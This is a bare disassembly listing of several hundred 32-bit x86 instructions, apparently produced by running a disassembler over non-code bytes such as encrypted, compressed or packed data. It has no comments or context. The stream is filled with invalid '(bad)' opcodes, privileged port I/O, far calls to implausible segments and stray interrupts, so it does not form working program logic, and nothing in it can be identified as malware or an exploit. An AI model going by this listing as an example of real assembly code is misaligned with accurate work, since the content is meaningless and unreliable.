  4123b5:	xor    ebx,DWORD PTR ds:0xa59904d5
  4123bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123bc:	adc    DWORD PTR [ebp-0x3f77cbf4],eax
  4123c2:	inc    esi
  4123c3:	out    0x3e,al
  4123c5:	jp     0x4123c3
  4123c7:	mov    cl,0x6f
  4123c9:	popf   
  4123ca:	sub    BYTE PTR [edx],cl
  4123cc:	push   ebp
  4123cd:	cli    
  4123ce:	test   BYTE PTR [ebp+ebx*2-0x1],0xe4
  4123d3:	dec    esi
  4123d4:	dec    ebx
  4123d5:	fimul  WORD PTR [ebx+0x5192f046]
  4123db:	int    0x1b
  4123dd:	cwde   
  4123de:	push   esi
  4123df:	mul    BYTE PTR [eax+0x78]
  4123e2:	sub    ebp,DWORD PTR [ebp+eiz*8-0x60]
  4123e6:	jp     0x41236e
  4123e8:	jo     0x412382
  4123ea:	ds jmp 0x412424
  4123ed:	pop    es
  4123ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123ef:	mov    ebp,0xf25b77e6
  4123f4:	fisttp DWORD PTR [eax+0x6b]
  4123f7:	imul   ebp,ebp,0xd67d7d5d
  4123fd:	add    eax,0x2b136077
  412402:	xchg   edi,eax
  412403:	xchg   ecx,eax
  412404:	fld    QWORD PTR [ecx+0x6e]
  412407:	adc    al,0x3
  412409:	sbb    bh,BYTE PTR [esi-0x7]
  41240c:	push   esp
  41240d:	pop    eax
  41240e:	xchg   esi,eax
  41240f:	adc    DWORD PTR [edx],ebp
  412411:	xor    al,0xb9
  412413:	inc    edi
  412414:	adc    DWORD PTR [ebx+0x42a6faff],edx
  41241a:	jle    0x412431
  41241c:	cld    
  41241d:	test   DWORD PTR [esp+edi*1+0x5569cbfa],0x2f1c0e31
  412428:	rcl    DWORD PTR [edx-0x69],cl
  41242b:	sti    
  41242c:	in     eax,0x5a
  41242e:	popa   
  41242f:	(bad)  
  412430:	js     0x4123c5
  412432:	add    edi,DWORD PTR [eax-0x6b]
  412435:	cdq    
  412436:	mov    dl,0xed
  412438:	cmp    eax,0x44444bfc
  41243d:	imul   ebp,DWORD PTR [ebx+0x65],0xffffff90
  412441:	bound  edi,QWORD PTR [eax-0x56]
  412444:	push   edi
  412445:	push   es
  412446:	pop    es
  412447:	sar    esi,cl
  412449:	call   0xa3a1bdd3
  41244e:	fdivr  st(2),st
  412450:	nop
  412451:	push   0x5d
  412453:	popf   
  412454:	ret    
  412455:	jmp    0x4bfd:0x37a830f7
  41245c:	cld    
  41245d:	and    DWORD PTR [eax],ecx
  41245f:	int    0x3c
  412461:	and    ch,BYTE PTR [ecx]
  412463:	cli    
  412464:	or     eax,0xf4cb877f
  412469:	adc    DWORD PTR [esi],ecx
  41246b:	and    edx,edx
  41246d:	dec    edi
  41246e:	leave  
  41246f:	ret    0xfa4
  412472:	mov    ds:0xdded48e0,eax
  412477:	inc    ecx
  412478:	lods   eax,DWORD PTR ds:[esi]
  412479:	in     al,dx
  41247a:	cmc    
  41247b:	mov    BYTE PTR [esi+0x35625243],dl
  412481:	outs   dx,BYTE PTR ds:[esi]
  412482:	or     BYTE PTR [eax-0x71],dh
  412485:	dec    esp
  412486:	ret    0x9f59
  412489:	mov    ebx,0x43fcde18
  41248e:	push   eax
  41248f:	sti    
  412490:	jo     0x412510
  412492:	stos   DWORD PTR es:[edi],eax
  412493:	or     DWORD PTR [edi-0x6c38d29a],ebx
  412499:	nop
  41249a:	imul   edx,DWORD PTR [ebx-0x1d],0x322e0f0e
  4124a1:	push   cs
  4124a2:	addr16 fcmovnb st,st(2)
  4124a5:	dec    esi
  4124a6:	call   0xf80e:0x5672b00a
  4124ad:	jmp    0xac500f3b
  4124b2:	xor    bh,BYTE PTR [edi-0x66c032ad]
  4124b8:	mov    WORD PTR ds:0x8f063d47,?
  4124be:	inc    edx
  4124bf:	push   es
  4124c0:	iret   
  4124c1:	lods   al,BYTE PTR ds:[esi]
  4124c2:	push   esp
  4124c3:	mov    edi,0x89f59b33
  4124c8:	fld    TBYTE PTR [ecx+0xe979302]
  4124ce:	xchg   ebp,eax
  4124cf:	data16 rcl BYTE PTR [eax-0x56],cl
  4124d3:	pop    ebx
  4124d4:	push   cs
  4124d5:	inc    esp
  4124d6:	push   ebx
  4124d7:	jno    0x4124ff
  4124d9:	test   eax,0xaed7938a
  4124de:	push   eax
  4124df:	sbb    BYTE PTR [ebx+0x54ed9f59],bh
  4124e5:	cmp    dh,ah
  4124e7:	fst    DWORD PTR [eax+eiz*4-0x29c7a27a]
  4124ee:	xchg   esi,eax
  4124ef:	dec    esp
  4124f0:	push   eax
  4124f1:	(bad)  
  4124f2:	call   0x244:0x31569903
  4124f9:	repz dec esp
  4124fb:	sub    al,0xe3
  4124fd:	push   eax
  4124fe:	jge    0x4124a2
  412500:	xor    al,0x40
  412502:	dec    edx
  412503:	mov    DWORD PTR [edx-0x7e],esi
  412506:	jo     0x412546
  412508:	in     eax,dx
  412509:	scas   al,BYTE PTR es:[edi]
  41250a:	inc    esi
  41250b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41250c:	sub    dl,ch
  41250e:	sbb    DWORD PTR [edx+0x2d229e3f],ecx
  412514:	xchg   ebx,eax
  412515:	inc    edx
  412516:	aas    
  412517:	sbb    bh,dh
  412519:	rcr    DWORD PTR [edi+esi*2-0x5d],1
  41251d:	and    DWORD PTR es:[eax],esi
  412520:	dec    ecx
  412521:	jne    0x41250b
  412523:	repz xor ah,ch
  412526:	test   BYTE PTR [esi+0x23541790],dh
  41252c:	push   ebp
  41252d:	jg     0x4125a1
  41252f:	mov    BYTE PTR [eax-0x1c],dl
  412532:	fnsave [edx+0x7870c807]
  412538:	dec    edx
  412539:	xchg   esp,eax
  41253a:	dec    ebp
  41253b:	dec    esp
  41253c:	push   edi
  41253d:	in     eax,dx
  41253e:	inc    edx
  41253f:	test   al,0x60
  412541:	fldenv [edi-0x77461129]
  412547:	rcl    BYTE PTR [eax+0x42dae979],cl
  41254d:	pop    ss
  41254e:	pop    esp
  41254f:	cmc    
  412550:	xchg   cl,bh
  412552:	outs   dx,BYTE PTR ds:[esi]
  412553:	outs   dx,BYTE PTR ds:[esi]
  412554:	test   eax,eax
  412556:	mov    cl,0xfd
  412558:	push   ebx
  412559:	cmp    ebp,DWORD PTR [esi-0x352f710]
  41255f:	and    BYTE PTR [eax+ebx*4+0x3f],ah
  412563:	adc    eax,0x5e472f1e
  412568:	sub    eax,DWORD PTR [edx]
  41256a:	add    esi,ecx
  41256c:	fisttp DWORD PTR [esp-0x31]
  412570:	div    DWORD PTR [esi-0x49]
  412573:	(bad)  
  412574:	sub    dl,BYTE PTR [ebx]
  412576:	xchg   edi,eax
  412577:	cmp    eax,0x5738c8b3
  41257c:	mov    BYTE PTR [edx],dh
  41257e:	xchg   esp,eax
  41257f:	sub    DWORD PTR [ebp+0x99e5d43],esp
  412585:	in     al,0x7a
  412587:	inc    edi
  412588:	sub    esi,ebp
  41258a:	push   ss
  41258b:	pop    ds
  41258c:	mov    edi,0x54bb1019
  412591:	pop    ss
  412592:	int3   
  412593:	jne    0x41253a
  412595:	xchg   ecx,eax
  412596:	les    ebx,FWORD PTR [edi-0x6c]
  412599:	aaa    
  41259a:	scas   eax,DWORD PTR es:[edi]
  41259b:	xor    DWORD PTR [ebx],ecx
  41259d:	cli    
  41259e:	popf   
  41259f:	aam    0x5e
  4125a1:	push   ds
  4125a2:	fist   WORD PTR [esp+edi*4-0x80]
  4125a6:	mov    eax,0x8ce7b5a3
  4125ab:	inc    edi
  4125ac:	in     al,0x10
  4125ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125af:	xor    ch,BYTE PTR [esi-0x37c27d93]
  4125b5:	pop    esi
  4125b6:	pop    edi
  4125b7:	inc    ebp
  4125b8:	add    DWORD PTR [ebx+ebx*8-0x32],edi
  4125bc:	mov    ds:0xedb225e3,eax
  4125c1:	dec    eax
  4125c2:	push   esp
  4125c3:	cdq    
  4125c4:	mov    bx,0x925c
  4125c8:	cmp    cl,BYTE PTR [esi+0x26]
  4125cb:	jmp    0x8e76612
  4125d0:	lods   eax,DWORD PTR ds:[esi]
  4125d1:	add    cl,BYTE PTR [edi-0x574b983d]
  4125d7:	lahf   
  4125d8:	xchg   esp,eax
  4125d9:	call   0x9b08b157
  4125de:	popf   
  4125df:	rcl    DWORD PTR [esp+ebx*1-0x33],cl
  4125e3:	sbb    eax,0xdb3b9522
  4125e8:	pop    edi
  4125e9:	jne    0x4125f6
  4125eb:	and    BYTE PTR [esi+0x1cdf6474],ah
  4125f1:	aam    0x26
  4125f3:	test   BYTE PTR [edx-0x36],0x4e
  4125f7:	add    BYTE PTR [eax-0x75],ch
  4125fa:	(bad)  
  4125fb:	dec    esi
  4125fc:	rol    DWORD PTR [ecx+0x74232e1c],1
  412602:	mov    esi,0x472fd239
  412607:	popf   
  412608:	int    0x27
  41260a:	jle    0x4125b0
  41260c:	test   BYTE PTR [esi+0x2f],ah
  41260f:	push   ds
  412610:	js     0x412691
  412612:	cwde   
  412613:	push   edi
  412614:	xor    eax,0x66f61101
  412619:	lods   eax,DWORD PTR ds:[esi]
  41261a:	pop    edx
  41261b:	pop    esi
  41261c:	sbb    esi,DWORD PTR [eax+0x29]
  41261f:	cmp    al,0x75
  412621:	jg     0x41268a
  412623:	imul   ecx,DWORD PTR [ebx],0xffffffed
  412626:	sar    BYTE PTR [eax-0x3f1fa880],cl
  41262c:	out    dx,al
  41262d:	pop    esi
  41262e:	xor    al,0x65
  412630:	pop    eax
  412631:	push   0x4f
  412633:	popf   
  412634:	aas    
  412635:	dec    ecx
  412636:	int    0xf2
  412638:	xor    al,BYTE PTR [ebp+0x4b]
  41263b:	add    eax,0xb5e0260
  412640:	(bad)  
  412641:	lock mov ss,WORD PTR [eax-0x5840f991]
  412648:	retf   
  412649:	mov    ds:0xe63f632d,al
  41264e:	jecxz  0x412694
  412650:	xchg   ebp,eax
  412651:	xor    DWORD PTR [edi+0x12],edi
  412654:	jnp    0x4126bc
  412656:	inc    esp
  412657:	and    eax,0x61a2e583
  41265c:	push   ecx
  41265d:	ret    0x4738
  412660:	sar    DWORD PTR [ecx+0x52],0x6e
  412664:	push   edx
  412665:	pushf  
  412666:	xor    DWORD PTR [ebx+edi*2],edx
  412669:	loope  0x412684
  41266b:	push   ss
  41266c:	push   cs
  41266d:	sbb    BYTE PTR [ebx-0x6cc87e6b],0xcf
  412674:	jp     0x4126ad
  412676:	ficom  WORD PTR [ebx+0x4c]
  412679:	stos   DWORD PTR es:[edi],eax
  41267a:	mov    ah,0x8b
  41267c:	dec    esp
  41267d:	dec    esp
  41267e:	xor    bl,BYTE PTR [ecx*4+0x8beae85]
  412685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412686:	jne    0x4126ce
  412688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412689:	sbb    dh,dl
  41268b:	push   ebx
  41268c:	test   BYTE PTR [esi],bh
  41268e:	pushf  
  41268f:	or     BYTE PTR [eax],dh
  412691:	fild   WORD PTR [eax+ecx*2-0x5a]
  412695:	(bad)  
  412696:	out    dx,al
  412697:	dec    ecx
  412698:	ds xor al,0x21
  41269b:	(bad)  
  41269c:	cdq    
  41269d:	cs std 
  41269f:	dec    ebx
  4126a0:	push   ss
  4126a1:	out    0xa6,eax
  4126a3:	pop    esi
  4126a4:	adc    BYTE PTR [edx-0x5bd4e6cf],cl
  4126aa:	dec    ebx
  4126ab:	xchg   ebx,eax
  4126ac:	inc    edx
  4126ad:	xor    dl,cl
  4126af:	fadd   QWORD PTR [ebx]
  4126b1:	mov    eax,ds:0xf96da27e
  4126b6:	dec    ebp
  4126b7:	push   ebx
  4126b8:	lahf   
  4126b9:	sub    DWORD PTR [edi-0x59c11cde],ebp
  4126bf:	adc    BYTE PTR [esi-0x4b36a1cf],0xd7
  4126c6:	mov    edi,0x92c75e36
  4126cb:	stos   DWORD PTR es:[di],eax
  4126cd:	add    ebx,ecx
  4126cf:	jno    0x412663
  4126d1:	adc    BYTE PTR [esi],ch
  4126d3:	push   ecx
  4126d4:	dec    edi
  4126d5:	xchg   edx,eax
  4126d6:	push   0xffffffb6
  4126d8:	cmp    eax,0x3325536
  4126dd:	aad    0x3c
  4126df:	sbb    al,0x77
  4126e1:	xor    BYTE PTR [esi+0x13f7f7f1],dl
  4126e7:	cmova  eax,DWORD PTR [edx]
  4126ea:	test   al,0x2f
  4126ec:	adc    BYTE PTR [eax-0xd],ah
  4126ef:	mov    DWORD PTR [edi+ecx*2-0x1649d36d],eax
  4126f6:	cmp    eax,0x1811cbc6
  4126fb:	lods   eax,DWORD PTR ds:[esi]
  4126fc:	mov    esi,0x83def854
  412701:	stos   BYTE PTR es:[edi],al
  412702:	mov    ch,0xf8
  412704:	fwait
  412705:	sbb    ebx,DWORD PTR [ebx]
  412707:	in     eax,0x78
  412709:	adc    ebp,DWORD PTR [edi+0x42]
  41270c:	ins    DWORD PTR es:[edi],dx
  41270d:	pop    edx
  41270e:	ins    BYTE PTR es:[edi],dx
  41270f:	dec    edx
  412710:	sub    DWORD PTR [edi+edi*2],esi
  412713:	lds    esi,FWORD PTR [edx]
  412715:	std    
  412716:	retf   0x6e96
  412719:	(bad)  
  41271a:	fld    TBYTE PTR [edi]
  41271c:	dec    edx
  41271d:	aad    0xab
  41271f:	int    0x65
  412721:	or     eax,0x314fab50
  412726:	clc    
  412727:	pop    ecx
  412728:	daa    
  412729:	inc    esp
  41272a:	aaa    
  41272b:	mov    eax,0x91ce64d0
  412730:	mov    ds:0x443f6f07,eax
  412735:	arpl   WORD PTR [edi-0x4c3c2c5f],bx
  41273b:	inc    ebp
  41273c:	scas   al,BYTE PTR es:[edi]
  41273d:	mov    esp,0x1da2407e
  412742:	mov    DWORD PTR [esi+ecx*1],ebp
  412745:	mov    bl,0xd8
  412747:	fld    QWORD PTR [edx+0x73]
  41274a:	sahf   
  41274b:	push   ss
  41274c:	mov    cl,0xa9
  41274e:	shl    BYTE PTR [edx-0x5d],0x96
  412752:	in     eax,0x8c
  412754:	push   0x6
  412756:	pushf  
  412757:	mov    ah,0xdb
  412759:	scas   al,BYTE PTR es:[edi]
  41275a:	mov    esp,0xb4dcbd21
  41275f:	pop    ebp
  412760:	sub    DWORD PTR [edi],esp
  412762:	js     0x4127c4
  412764:	out    0x8a,eax
  412766:	add    DWORD PTR es:[eax+0x52],0x8cdb7174
  41276e:	push   ebp
  41276f:	push   esp
  412770:	adc    DWORD PTR [ebx+0x7edb7fd2],esp
  412776:	jo     0x412785
  412778:	stc    
  412779:	cmp    ch,BYTE PTR [ebp-0x4e]
  41277c:	rol    DWORD PTR [ebp+0x24630aaa],cl
  412782:	outs   dx,BYTE PTR ds:[esi]
  412783:	cmp    DWORD PTR [ebx+0xc9146c4],0x29
  41278a:	jns    0x41279c
  41278c:	stos   BYTE PTR es:[edi],al
  41278d:	xor    DWORD PTR [ebp+0x6a10087f],esi
  412793:	ret    
  412794:	int3   
  412795:	ins    BYTE PTR es:[edi],dx
  412796:	pop    edx
  412797:	icebp  
  412798:	imul   esi,DWORD PTR [ebp+0x44e352b1],0x67
  41279f:	xchg   edx,eax
  4127a0:	adc    BYTE PTR [esi+0x5df4bdf3],0x13
  4127a7:	cwde   
  4127a8:	push   0xb6a3745d
  4127ad:	and    ebx,DWORD PTR [edx]
  4127af:	test   eax,0x2e99a81f
  4127b4:	dec    edi
  4127b5:	fsubr  QWORD PTR [ebp-0x77]
  4127b8:	xchg   ebx,eax
  4127b9:	pusha  
  4127ba:	data16 cld 
  4127bc:	fcomp  QWORD PTR [ebp+0x2a]
  4127bf:	or     eax,0x3c7186b5
  4127c4:	in     al,0x74
  4127c6:	inc    esp
  4127c7:	add    BYTE PTR [ecx+0x47],0x28
  4127cb:	push   esp
  4127cc:	cli    
  4127cd:	dec    eax
  4127ce:	add    BYTE PTR [ebp+0x31],cl
  4127d1:	mov    BYTE PTR [ebx],dh
  4127d3:	dec    esi
  4127d4:	(bad)  {k5}{z}
  4127d9:	sub    DWORD PTR [ecx],ebx
  4127db:	mov    ds:0x7f15a9a2,al
  4127e0:	pop    ebp
  4127e1:	in     eax,0x7c
  4127e3:	jmp    0xf18b:0xd3ccd29c
  4127ea:	outs   dx,BYTE PTR ds:[esi]
  4127eb:	in     al,dx
  4127ec:	in     al,0x64
  4127ee:	push   ds
  4127ef:	call   0xf691:0xc82b3c83
  4127f6:	jnp    0x4127e8
  4127f8:	addr16 gs pushf 
  4127fb:	adc    bh,BYTE PTR ds:0x50be1b71
  412801:	data16 or al,0xa6
  412804:	sbb    ebp,ebx
  412806:	sub    ebp,DWORD PTR [edi]
  412808:	xor    DWORD PTR [ebx+0x245d3522],ebp
  41280e:	mov    edx,0xb5c7dedc
  412813:	(bad)
  412817:	out    0x35,eax
  412819:	(bad)  
  41281a:	std    
  41281b:	adc    BYTE PTR [esp+ebp*8],0x64
  41281f:	out    0xab,al
  412821:	xchg   edi,eax
  412822:	or     eax,0x422ddc82
  412827:	mov    cl,dh
  412829:	es dec ebx
  41282b:	gs into 
  41282d:	xchg   esp,eax
  41282e:	sbb    eax,ebx
  412830:	in     eax,0xe9
  412832:	push   esi
  412833:	ss sub dh,ch
  412836:	fcmovnbe st,st(0)
  412838:	std    
  412839:	repz mov al,ds:0x16c7aba1
  41283f:	in     eax,dx
  412840:	mov    ecx,0x2167a29a
  412845:	adc    al,0xfb
  412847:	retf   
  412848:	and    al,ch
  41284a:	sub    dl,BYTE PTR [esi]
  41284c:	pop    es
  41284d:	push   esp
  41284e:	pop    eax
  41284f:	mov    DWORD PTR [ebp+0xe],edi
  412852:	neg    cl
  412854:	pop    edx
  412855:	dec    ecx
  412856:	cmc    
  412857:	cwde   
  412858:	in     eax,dx
  412859:	jne    0x412835
  41285b:	add    DWORD PTR [edi],ecx
  41285d:	push   eax
  41285e:	adc    bh,al
  412860:	ins    BYTE PTR es:[edi],dx
  412861:	sub    DWORD PTR [ebx],ecx
  412863:	fs js  0x4128cb
  412866:	scas   eax,DWORD PTR es:[edi]
  412867:	inc    esp
  412868:	test   BYTE PTR [eax-0x6a],dh
  41286b:	jg     0x41283b
  41286d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41286e:	inc    esp
  41286f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412870:	add    bl,al
  412872:	add    BYTE PTR ds:0x19c96f9f,bh
  412878:	rcl    BYTE PTR [edi+0x2a],1
  41287b:	icebp  
  41287c:	lods   al,BYTE PTR ds:[esi]
  41287d:	loopne 0x412840
  41287f:	in     eax,dx
  412880:	jne    0x412838
  412882:	out    dx,al
  412883:	adc    DWORD PTR [eax-0x65],0xffffff97
  412887:	inc    edi
  412888:	pop    esi
  412889:	cwde   
  41288a:	inc    edx
  41288b:	imul   edx,edi,0xf924a5ec
  412891:	mov    bl,0x74
  412893:	jbe    0x4128f9
  412895:	ficom  WORD PTR [ebx]
  412897:	leave  
  412898:	hlt    
  412899:	dec    ebx
  41289a:	xchg   DWORD PTR [esi+0x39],esi
  41289d:	and    eax,0xc
  4128a0:	lods   eax,DWORD PTR ds:[esi]
  4128a1:	dec    esi
  4128a2:	je     0x412842
  4128a4:	push   0x8866a786
  4128a9:	sti    
  4128aa:	fimul  WORD PTR ds:0xaf33926c
  4128b0:	fstp   QWORD PTR [edx+0x1b]
  4128b3:	jne    0x4128fa
  4128b5:	loopne 0x412862
  4128b7:	cwde   
  4128b8:	sub    BYTE PTR [esi+ecx*1+0x74],cl
  4128bc:	cmp    eax,0xac8f4a00
  4128c1:	ja     0x41291d
  4128c3:	retf   
  4128c4:	and    DWORD PTR [edi],esp
  4128c6:	out    0xaa,eax
  4128c8:	retf   
  4128c9:	mov    ch,0x35
  4128cb:	dec    ebp
  4128cc:	push   es
  4128cd:	test   DWORD PTR [edi+0x22c9b28d],edx
  4128d3:	pushf  
  4128d4:	sbb    eax,esi
  4128d6:	mov    ss,esi
  4128d8:	mov    BYTE PTR [edi-0x60],dl
  4128db:	fild   WORD PTR [ecx+0x19]
  4128de:	test   BYTE PTR [eax-0x1c],0x51
  4128e2:	xchg   esi,eax
  4128e3:	mov    esp,DWORD PTR [esp+ebx*2]
  4128e6:	gs mov ch,0xd2
  4128e9:	pop    ecx
  4128ea:	cdq    
  4128eb:	fsubp  st(5),st
  4128ed:	push   ss
  4128ee:	inc    edx
  4128ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128f0:	sti    
  4128f1:	jg     0x412965
  4128f3:	std    
  4128f4:	and    DWORD PTR [ebp+0x8],esi
  4128f7:	mov    al,BYTE PTR [ebx-0x57]
  4128fa:	cs stos BYTE PTR es:[edi],al
  4128fc:	adc    bl,al
  4128fe:	push   0x2701c480
  412903:	bound  eax,QWORD PTR [edi+esi*4-0x41]
  412907:	sahf   
  412908:	cdq    
  412909:	psubb  mm0,QWORD PTR [esp+edi*8+0x9]
  41290e:	mov    esi,0xe396214d
  412913:	jmp    0x4128c6
  412915:	jmp    0x412918
  412917:	cmp    BYTE PTR [esi+0x55],0x69
  41291b:	push   ecx
  41291c:	push   ebp
  41291d:	call   0x110f:0x7febbccb
  412924:	xchg   bl,dl
  412926:	test   al,0x43
  412928:	push   edx
  412929:	js     0x41292b
  41292b:	xchg   ebx,eax
  41292c:	sbb    esp,DWORD PTR [edi-0x2e]
  41292f:	mov    edi,0x171c307d
  412934:	xchg   DWORD PTR [edi-0x52],ebx
  412937:	or     ah,ah
  412939:	shr    ah,cl
  41293b:	mul    bh
  41293d:	adc    BYTE PTR [ebp+eiz*8-0xd],0x4b
  412942:	aam    0xd1
  412944:	push   ds
  412945:	and    al,0xbf
  412947:	jbe    0x412921
  412949:	les    ebx,FWORD PTR [ecx+eiz*4]
  41294c:	jp     0x41295f
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	mov    ds:0xb8a082c,eax
  412954:	ja     0x412941
  412956:	mov    eax,ebp
  412958:	lahf   
  412959:	clc    
  41295a:	or     DWORD PTR [edx-0x36],ebp
  41295d:	stos   BYTE PTR es:[edi],al
  41295e:	mov    bl,0xb0
  412960:	das    
  412961:	xchg   edx,eax
  412962:	int3   
  412963:	and    al,BYTE PTR [ebx]
  412965:	push   ecx
  412966:	pushf  
  412967:	in     al,dx
  412968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412969:	call   0x56d59364
  41296e:	cmp    BYTE PTR [esp+edi*2],dh
  412971:	push   0xffffffeb
  412973:	fisub  WORD PTR [esi]
  412975:	dec    ebp
  412976:	ins    BYTE PTR es:[edi],dx
  412977:	jae    0x4129c5
  412979:	test   BYTE PTR [edi-0x60],ch
  41297c:	xchg   esi,eax
  41297d:	out    dx,al
  41297e:	adc    eax,DWORD PTR [ecx-0x64]
  412981:	or     bl,BYTE PTR [eax+0x612488b4]
  412987:	xchg   edx,eax
  412988:	in     al,dx
  412989:	and    BYTE PTR [edi],ch
  41298b:	imul   ebp,edx,0x72
  41298e:	pop    ds
  41298f:	mov    eax,ds:0x63969532
  412994:	jbe    0x412986
  412996:	lods   eax,DWORD PTR ds:[esi]
  412997:	pop    ss
  412998:	and    al,0x4e
  41299a:	xchg   esi,eax
  41299b:	jmp    0xd1d674be
  4129a0:	pop    ecx
  4129a1:	inc    ebp
  4129a2:	cmp    DWORD PTR [edi-0x51],ebx
  4129a5:	dec    ebp
  4129a6:	imul   edi,DWORD PTR [ebp+0x179c770],0xe2ea32cd
  4129b0:	stos   BYTE PTR es:[edi],al
  4129b1:	add    bh,BYTE PTR [esi-0x2d]
  4129b4:	mov    esi,0x8b73b0f0
  4129b9:	je     0x412961
  4129bb:	mov    ecx,0xdc0489f6
  4129c0:	xchg   esi,eax
  4129c1:	xchg   ebx,eax
  4129c2:	mov    edx,0x163a54ea
  4129c7:	fadd   QWORD PTR [edx+0xd]
  4129ca:	mov    ebx,0x4f14dff
  4129cf:	outs   dx,DWORD PTR ds:[esi]
  4129d0:	pop    ebx
  4129d1:	imul   BYTE PTR [esi+0x4c]
  4129d4:	or     dl,BYTE PTR [ebp+0x64cf6699]
  4129da:	jg     0x412992
  4129dc:	mov    BYTE PTR [edi-0x65],al
  4129df:	aam    0x7
  4129e1:	pop    ebp
  4129e2:	dec    ebp
  4129e3:	cmp    DWORD PTR [eax-0x4b],ebx
  4129e6:	call   0x67ce:0x7ceee1f7
  4129ed:	inc    edx
  4129ee:	add    cl,0xd2
  4129f1:	ss dec edx
  4129f3:	mul    al
  4129f5:	ds jb  0x412a67
  4129f8:	test   DWORD PTR [edx-0x18aa06ab],esp
  4129fe:	(bad)
  412a03:	xor    eax,0x214e8e6a
  412a08:	lahf   
  412a09:	add    BYTE PTR [edx],al
  412a0b:	sbb    eax,0x181023e
  412a10:	fbstp  TBYTE PTR [esi-0x7d]
  412a13:	or     ch,al
  412a15:	sub    eax,0xff0f7580
  412a1a:	mov    ds:0x1d118669,eax
  412a1f:	ins    DWORD PTR es:[edi],dx
  412a20:	mov    ecx,0x3975bae5
  412a25:	inc    edx
  412a26:	mov    esi,0x4ec68758
  412a2b:	out    0x59,al
  412a2d:	add    DWORD PTR ds:0x1057b3d7,eax
  412a33:	lea    esp,[eax]
  412a35:	jg     0x412aaf
  412a37:	pushf  
  412a38:	ret    
  412a39:	outs   dx,DWORD PTR ds:[esi]
  412a3a:	mov    edi,0x22c26786
  412a3f:	xchg   esi,eax
  412a40:	inc    ecx
  412a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a42:	lock cwde 
  412a44:	adc    ebp,edx
  412a46:	int    0xc2
  412a48:	mov    bl,0xd6
  412a4a:	or     ebp,DWORD PTR [esi]
  412a4c:	loop   0x4129ed
  412a4e:	adc    BYTE PTR [eax],dh
  412a50:	fcmovbe st,st(3)
  412a52:	jae    0x4129ea
  412a54:	inc    ebp
  412a55:	das    
  412a56:	mov    ch,0x12
  412a58:	bnd jae 0x412a22
  412a5b:	sub    DWORD PTR [edi-0x4c10c466],eax
  412a61:	sbb    BYTE PTR [ecx],0xf3
  412a64:	inc    esi
  412a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a66:	icebp  
  412a67:	sahf   
  412a68:	push   cs
  412a69:	lods   eax,DWORD PTR ds:[esi]
  412a6a:	ins    BYTE PTR es:[edi],dx
  412a6b:	pushf  
  412a6c:	stc    
  412a6d:	fwait
  412a6e:	leave  
  412a6f:	mov    bh,0x58
  412a71:	pop    ebp
  412a72:	aaa    
  412a73:	dec    edx
  412a74:	(bad)  
  412a75:	retf   
  412a76:	push   ecx
  412a77:	inc    eax
  412a78:	fwait
  412a79:	jae    0x412af7
  412a7b:	enter  0x2955,0x6a
  412a7f:	and    DWORD PTR [ebp+0x4],ebp
  412a82:	jle    0x412a83
  412a84:	enter  0xad2b,0xe1
  412a88:	fadd   QWORD PTR ds:0x31db5065
  412a8e:	cs dec ebp
  412a90:	cmp    BYTE PTR [ecx+0x7a],bh
  412a93:	dec    esi
  412a94:	dec    ebp
  412a95:	or     DWORD PTR [edi-0x16],ebp
  412a98:	xor    eax,0x2ca554c8
  412a9d:	cmp    al,0xf1
  412a9f:	jns    0x412a60
  412aa1:	repz stc 
  412aa3:	sub    al,0xf0
  412aa5:	rcr    DWORD PTR [ebx-0x42],1
  412aa8:	xchg   BYTE PTR [edx-0x4b277868],bh
  412aae:	and    al,0xb6
  412ab0:	dec    ebp
  412ab1:	aam    0xb0
  412ab3:	or     DWORD PTR [ecx+edx*4+0x20],eax
  412ab7:	jb     0x412ae4
  412ab9:	inc    ebp
  412aba:	sbb    DWORD PTR [ebx-0x65],ecx
  412abd:	cmp    eax,0xd81050f1
  412ac2:	pop    ebx
  412ac3:	loopne 0x412ac2
  412ac5:	test   al,0x7f
  412ac7:	aas    
  412ac8:	sahf   
  412ac9:	pop    esp
  412aca:	inc    esp
  412acb:	stos   BYTE PTR es:[edi],al
  412acc:	repnz mov cl,0xc6
  412acf:	nop
  412ad0:	aad    0xea
  412ad2:	shl    BYTE PTR [eax+0x61a5c3eb],0x4a
  412ad9:	addr16 push ebp
  412adb:	push   ebp
  412adc:	dec    ebx
  412add:	rcl    DWORD PTR [eax+0x3a],cl
  412ae0:	sahf   
  412ae1:	jecxz  0x412b44
  412ae3:	frstpm(287 only) 
  412ae5:	mov    esp,0x27e8beeb
  412aea:	int    0x95
  412aec:	popa   
  412aed:	call   0x5f50:0x7b26bec7
  412af4:	xor    BYTE PTR [edx],bh
  412af6:	nop
  412af7:	add    eax,0xe9153dc0
  412afc:	cld    
  412afd:	lock sub dl,dl
  412b00:	xchg   BYTE PTR [eax+0x64],ah
  412b03:	std    
  412b04:	mov    al,0x92
  412b06:	adc    BYTE PTR [ebx+0x29],0x74
  412b0a:	cmc    
  412b0b:	cs pop esp
  412b0d:	ins    BYTE PTR es:[edi],dx
  412b0e:	adc    edi,DWORD PTR [edi]
  412b10:	jae    0x412ae4
  412b12:	xchg   esp,eax
  412b13:	div    BYTE PTR ds:[esp+ecx*4-0x4e]
  412b18:	cmp    BYTE PTR [edi+0x7c56f7d2],al
  412b1e:	pop    eax
  412b1f:	ss push 0xffffff9a
  412b22:	loope  0x412ab8
  412b24:	call   0xca493f95
  412b29:	inc    edx
  412b2a:	clc    
  412b2b:	pop    ebp
  412b2c:	rcl    DWORD PTR [ebx+eiz*4-0x75],1
  412b30:	aas    
  412b31:	add    eax,0x2ff85af3
  412b36:	sub    al,0xa2
  412b38:	adc    al,0x5b
  412b3a:	popf   
  412b3b:	or     BYTE PTR [ebx+0x797016fd],dl
  412b41:	mov    ecx,0x3902b1c8
  412b46:	jle    0x412bb2
